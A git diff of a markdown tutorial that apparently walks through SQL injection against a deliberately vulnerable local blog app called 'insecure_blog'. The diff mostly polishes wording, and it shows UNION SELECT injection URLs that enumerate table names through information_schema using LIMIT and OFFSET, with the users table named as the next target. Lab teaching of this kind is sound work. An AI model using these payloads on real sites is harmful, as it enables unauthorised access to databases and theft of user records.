@@ -13,14 +13,15 @@ SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema =
 ```
 
 where:
-- **table_name** is the column where the tables get stored,
-- **table_schema** is the column where the databases get stored.
+- **table_name** is the column where the table's name get stored,
+- **table_schema** is the column where the database's name get stored
 
 > **Note:**
->   is important to use **distinct(table_name)** because there is one table_name for each column of each table. 
-> This means that if one table has 10 columns will be 10 rows in the table_name column
+>   is important to use **distinct(table_name)** instead of **table_name** alone, because there is one table_name for each column of each table. 
+> This means that if one table has 10 columns there will be 10 rows in the table_name column
 
-The we inject the query in the browser:
+
+Then we inject the query in the browser:
 ```shell
 http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog'),3,4,5,6,7,8,9/slug-name-post'
 ```
@@ -33,20 +34,22 @@ This query, just like in the previous step will return an error:
 }
 ```
 
-We can use the same trick (LIMIT + OFFSET) to get the job done:
+We can use the same trick (*LIMIT + OFFSET*) to get the job done:
 ```shell
 http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
 ```
 
-And keep **increasing the OFFSET** to get all the tables.
+And keep **increasing the OFFSET** value to get all the tables.
+
+----------
 
 If all went well, we will have 3 tables:
 
-- Posts
-- Comments
-- Users
+- posts
+- comments
+- users
 
-Of course we will focous in the **Users table**.
+Of course we will focous in the **users table**.
 
 But this is for the next step.
-that is it for now!!
+That is it for now!!
